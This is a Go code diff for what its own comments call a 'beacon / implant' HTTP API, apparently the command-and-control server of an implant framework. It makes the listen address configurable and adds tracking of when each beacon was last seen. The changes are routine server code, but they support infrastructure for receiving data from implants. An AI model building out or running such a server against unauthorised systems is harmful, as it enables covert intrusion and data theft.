@@ -31,8 +31,15 @@ const (
 	endpointFetchData     = "/fetch-data" + endpointUUID
 )
 
-// Start the API server
-func StartAPIServer() {
+// StartBeaconServer runs the beacon / implant HTTP API on addr (e.g. ":8080").
+// Set BEACON_ADDR to override the default when addr is empty.
+func StartBeaconServer(addr string) error {
+	if addr == "" {
+		addr = os.Getenv("BEACON_ADDR")
+		if addr == "" {
+			addr = ":8080"
+		}
+	}
 
 	r := mux.NewRouter()
 
@@ -60,8 +67,8 @@ func StartAPIServer() {
 	// // 404 fallback
 	r.NotFoundHandler = http.HandlerFunc(HandleFourOhFour)
 
-	log.Println("Server running on port 8080...")
-	log.Fatal(http.ListenAndServe(":8080", r))
+	log.Printf("Beacon API listening on %s", addr)
+	return http.ListenAndServe(addr, r)
 }
 
 // // Register a beacon. Cool idea, don't recommend to automate
@@ -227,6 +234,14 @@ func HandleReceiveUUID(w http.ResponseWriter, r *http.Request) {
 		http.Error(w, "Failed to store data", http.StatusInternalServerError)
 		return
 	}
+
+	go func(id string) {
+		ctx, cancel := context.WithTimeout(context.Background(), 5*time.Second)
+		defer cancel()
+		if err := dbconnections.UpdateBeaconLastSeen(ctx, id); err != nil {
+			log.Printf("[-] last seen for %s: %v", id, err)
+		}
+	}(clientUUID)
 
 	JsonResponse(w, http.StatusOK, map[string]string{"message": "Data received and stored successfully"})
 }
